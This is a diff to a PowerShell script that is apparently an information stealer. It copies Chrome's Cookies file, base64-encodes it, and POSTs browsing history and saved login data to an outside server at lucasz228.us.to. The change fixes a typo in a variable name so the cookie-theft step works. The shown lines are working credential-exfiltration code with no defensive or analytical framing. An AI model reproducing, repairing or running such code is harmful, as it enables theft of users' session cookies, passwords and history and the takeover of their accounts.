@@ -12,7 +12,7 @@ echo $base64string > "$($env:USERPROFILE)\out3.txt"
 
 Copy-Item "$($env:USERPROFILE)\AppData\Local\Google\Chrome\User Data\Default\Cookies" "$($env:USERPROFILE)\out4.f"
 $base64string = [Convert]::ToBase64String([IO.File]::ReadAllBytes("$($env:USERPROFILE)\out4.f"))
-echo $base64string > "$($env:USERPROFI LE)\out4.txt"
+echo $base64string > "$($env:USERPROFILE)\out4.txt"
 
 Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveHistory -Method POST -Body @{text=Get-Content "$($env:USERPROFILE)\out.txt" -Raw}
 Invoke-WebRequest -Uri http://lucasz228.us.to:50000/saveLoginData -Method POST -Body @{text=Get-Content "$($env:USERPROFILE)\out2.txt" -Raw}
